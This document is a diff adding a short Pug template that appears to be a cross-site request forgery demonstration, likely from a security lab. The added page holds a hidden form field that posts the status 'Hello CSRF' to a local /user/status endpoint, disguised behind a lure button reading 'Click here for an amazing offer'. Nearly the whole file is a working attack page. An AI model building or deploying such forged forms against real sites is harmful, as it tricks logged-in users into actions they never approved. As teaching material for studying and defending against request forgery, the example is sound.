@@ -1,0 +1,7 @@
+extends layout
+
+block content
+  h1 #{title}
+  form(method="post", action="http://localhost:3000/user/status")
+    input(type="hidden", id="status", name="status", value="Hello CSRF")
+    input(type="submit", value="Click here for an amazing offer")
